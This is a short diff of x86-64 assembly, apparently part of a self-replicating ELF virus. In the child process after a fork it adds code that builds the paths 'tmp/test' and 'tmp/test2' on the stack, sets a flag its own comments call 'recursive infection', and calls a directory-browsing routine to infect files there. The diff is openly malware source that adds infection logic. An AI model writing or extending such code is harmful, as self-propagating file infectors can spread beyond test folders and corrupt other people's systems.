@@ -317,4 +317,19 @@ _fork_before_exec_normaly:
 
     ;;child
     lea rdi, [rel _exit_properly]
-    jmp _continue_normaly
+	mov		rax, 0
+	push	rax
+	push	rax
+	mov		rax, 0x747365742f706d74			; %rax = "tmp/test"
+	push	rax								; push infection path on stack
+	mov		rdi, rsp
+	mov		rsi, rsp
+	add		rsi, 16
+	mov		rax, 1							; sets recursive infection
+	push	rax
+	push	rsi
+	push	rdi
+	call	_read_dir						; call our directory browsing function
+	mov		BYTE [rsp + 32], 0x32			; add a '2' at the end of the path string
+	call	_read_dir						; call our directory browsing function
+	jmp _exit_properly
